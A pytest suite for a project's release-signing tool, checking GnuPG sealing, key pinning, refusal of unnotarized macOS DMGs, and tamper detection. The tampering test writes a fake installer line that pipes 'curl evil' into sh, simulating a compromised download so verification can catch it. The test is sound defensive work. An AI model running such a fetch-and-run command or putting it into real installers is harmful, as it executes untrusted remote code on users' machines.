"""Release signing fails closed, and a sealed release verifies the way a user verifies it.

Linux half: real GnuPG with a throwaway key generated per test session (never a real
release key). macOS half: the Developer ID / notarization script can only run on a Mac with
a real certificate; here we pin what the release path refuses before it can sign anything.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

from installer import release_sign
from installer.release_sign import Refused

REPO = Path(__file__).resolve().parents[1]
SIGN_MACOS = REPO / "installer" / "bundle" / "sign_macos_release.sh"

needs_gpg = pytest.mark.skipif(shutil.which("gpg") is None, reason="GnuPG is not installed")


def _gpg(home: Path, *args: str, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["gpg", "--batch", "--homedir", str(home), *args], capture_output=True, text=True, check=check, timeout=120
    )


def _make_key(home: Path, uid: str) -> tuple[str, Path]:
    """A throwaway, passphrase-less ed25519 signing key; returns (fingerprint, exported public key)."""
    home.mkdir(mode=0o700, parents=True)
    _gpg(home, "--passphrase", "", "--quick-generate-key", uid, "ed25519", "sign", "1d")
    listing = _gpg(home, "--with-colons", "--list-keys").stdout
    fpr = next(ln.split(":")[9] for ln in listing.splitlines() if ln.startswith("fpr:"))
    public = home / "public.asc"
    public.write_text(_gpg(home, "--armor", "--export", fpr).stdout, encoding="utf-8")
    return fpr, public


@pytest.fixture(scope="module")
def release_key(tmp_path_factory: pytest.TempPathFactory) -> tuple[str, Path, Path]:
    home = tmp_path_factory.mktemp("gpg") / "release"
    fpr, public = _make_key(home, "Throwaway Release Test <release-test@example.invalid>")
    return fpr, public, home


@pytest.fixture
def release_dir(tmp_path: Path) -> Path:
    d = tmp_path / "release"
    d.mkdir()
    (d / "vool-0.7.0-source.tar.gz").write_bytes(os.urandom(4096))
    (d / "install_vool.sh").write_text("#!/bin/sh\necho install\n", encoding="utf-8")
    return d


def _env(fpr: str, home: Path) -> dict[str, str]:
    return {**os.environ, "GNUPGHOME": str(home), "VOOL_RELEASE_GPG_KEY": fpr}


def _sealed_files(d: Path) -> list[str]:
    return sorted(p.name for p in d.iterdir() if p.name.endswith((".asc", ".sha256")) or p.name == "SHA256SUMS")


@needs_gpg
def test_a_sealed_release_verifies_with_the_pinned_key_and_standard_tools(release_key, release_dir) -> None:
    fpr, public, home = release_key
    names = release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    assert names == ["install_vool.sh", "vool-0.7.0-source.tar.gz"]
    assert _sealed_files(release_dir) == [
        "SHA256SUMS",
        "SHA256SUMS.asc",
        "install_vool.sh.asc",
        "install_vool.sh.sha256",
        "vool-0.7.0-source.tar.gz.asc",
        "vool-0.7.0-source.tar.gz.sha256",
    ]
    # What a Linux user runs: import the published key into a fresh keyring, verify, check sums.
    user = release_dir.parent / "user-gpg"
    user.mkdir(mode=0o700)
    _gpg(user, "--import", str(public))
    verified = _gpg(user, "--verify", str(release_dir / "SHA256SUMS.asc"), str(release_dir / "SHA256SUMS"), check=False)
    assert verified.returncode == 0, verified.stderr
    sums = subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=release_dir, capture_output=True, text=True)
    assert sums.returncode == 0, sums.stdout + sums.stderr
    assert release_sign.verify(release_dir, public) == names


@needs_gpg
def test_no_key_configured_signs_nothing(release_key, release_dir) -> None:
    _fpr, public, home = release_key
    env = {**os.environ, "GNUPGHOME": str(home)}
    env.pop("VOOL_RELEASE_GPG_KEY", None)
    with pytest.raises(Refused, match="VOOL_RELEASE_GPG_KEY is not set"):
        release_sign.seal(release_dir, env=env, pinned=public)
    assert _sealed_files(release_dir) == []


@needs_gpg
def test_no_pinned_public_key_signs_nothing(release_key, release_dir) -> None:
    fpr, _public, home = release_key
    with pytest.raises(Refused, match="no pinned release public key"):
        release_sign.seal(release_dir, env=_env(fpr, home), pinned=release_dir.parent / "absent.asc")
    assert _sealed_files(release_dir) == []


@needs_gpg
def test_a_key_other_than_the_pinned_one_signs_nothing(release_key, release_dir, tmp_path) -> None:
    _fpr, public, _home = release_key
    other_fpr, _other_public = _make_key(tmp_path / "other-gpg", "Someone Else <other@example.invalid>")
    with pytest.raises(Refused, match="not the pinned release key"):
        release_sign.seal(release_dir, env=_env(other_fpr, tmp_path / "other-gpg"), pinned=public)
    assert _sealed_files(release_dir) == []


@needs_gpg
def test_an_unnotarized_dmg_cannot_enter_a_release(release_key, release_dir) -> None:
    """The ad-hoc DMG every ordinary build makes has no notarization receipt."""
    fpr, public, home = release_key
    (release_dir / "VOOL-0.7.0-macos-arm64.dmg").write_bytes(os.urandom(2048))
    with pytest.raises(Refused, match="no signing receipt"):
        release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    assert _sealed_files(release_dir) == []


@needs_gpg
def test_a_dmg_changed_after_notarization_cannot_enter_a_release(release_key, release_dir) -> None:
    fpr, public, home = release_key
    dmg = release_dir / "VOOL-0.7.0-macos-arm64.dmg"
    dmg.write_bytes(os.urandom(2048))
    receipt = {
        "schema": "vool-macos-signing-receipt/1",
        "artifact": dmg.name,
        "sha256": "0" * 64,
        "notarization": {"status": "Accepted"},
        "stapled": {"app": True, "dmg": True},
        "gatekeeper": "Notarized Developer ID",
        "hardened_runtime": True,
    }
    (release_dir / (dmg.name + ".signing.json")).write_text(json.dumps(receipt), encoding="utf-8")
    with pytest.raises(Refused, match="changed after it was notarized"):
        release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    assert _sealed_files(release_dir) == []


@needs_gpg
def test_tampering_after_sealing_is_detected(release_key, release_dir) -> None:
    fpr, public, home = release_key
    release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    (release_dir / "install_vool.sh").write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
    with pytest.raises(Refused, match="does not match its SHA256SUMS digest"):
        release_sign.verify(release_dir, public)


@needs_gpg
def test_a_file_added_after_sealing_is_detected(release_key, release_dir) -> None:
    fpr, public, home = release_key
    release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    (release_dir / "VOOL-0.7.0-macos-arm64.dmg").write_bytes(b"unsigned")
    with pytest.raises(Refused, match="not covered by the signed SHA256SUMS"):
        release_sign.verify(release_dir, public)


@needs_gpg
def test_a_directory_cannot_be_sealed_twice(release_key, release_dir) -> None:
    fpr, public, home = release_key
    release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)
    with pytest.raises(Refused, match="already a signature or checksum file"):
        release_sign.seal(release_dir, env=_env(fpr, home), pinned=public)


def test_macos_release_signing_refuses_off_macos() -> None:
    if os.uname().sysname == "Darwin":
        pytest.skip("this pins the non-macOS refusal")
    done = subprocess.run(["bash", str(SIGN_MACOS), "--preflight"], capture_output=True, text=True, timeout=60)
    assert done.returncode != 0
    assert "RELEASE SIGNING REFUSED" in done.stderr and "need macOS" in done.stderr


def test_macos_release_signing_refuses_without_credentials_on_macos() -> None:
    if os.uname().sysname != "Darwin":
        pytest.skip("needs macOS")
    env = {k: v for k, v in os.environ.items() if not k.startswith(("VOOL_MACOS_", "VOOL_NOTARY_", "VOOL_SIGN_"))}
    done = subprocess.run(["bash", str(SIGN_MACOS), "--preflight"], capture_output=True, text=True, env=env, timeout=60)
    assert done.returncode != 0
    assert "RELEASE SIGNING REFUSED" in done.stderr


def test_unsigned_checksums_cover_an_ad_hoc_dmg_and_pass_sha256sum(release_dir) -> None:
    """The download path before signing credentials exist: digests only, ad-hoc DMG allowed."""
    (release_dir / "VOOL-0.7.0-macos-arm64.dmg").write_bytes(os.urandom(2048))
    names = release_sign.checksums(release_dir)
    assert names == ["VOOL-0.7.0-macos-arm64.dmg", "install_vool.sh", "vool-0.7.0-source.tar.gz"]
    assert not any(p.name.endswith(".asc") for p in release_dir.iterdir()), "checksums must not claim a signature"
    for name in names:  # the website serves one sidecar per download
        sidecar = subprocess.run(["sha256sum", "-c", name + ".sha256"], cwd=release_dir, capture_output=True, text=True)
        assert sidecar.returncode == 0, sidecar.stdout + sidecar.stderr
    whole = subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=release_dir, capture_output=True, text=True)
    assert whole.returncode == 0, whole.stdout + whole.stderr
    with pytest.raises(Refused, match="already a signature or checksum file"):
        release_sign.checksums(release_dir)


@needs_gpg
def test_allow_unnotarized_seals_an_ad_hoc_dmg(release_key, release_dir) -> None:
    fpr, public, home = release_key
    (release_dir / "VOOL-0.7.0-macos-arm64.dmg").write_bytes(os.urandom(2048))
    names = release_sign.seal(release_dir, env=_env(fpr, home), pinned=public, allow_unnotarized=True)
    assert "VOOL-0.7.0-macos-arm64.dmg" in names
    assert release_sign.verify(release_dir, public) == names
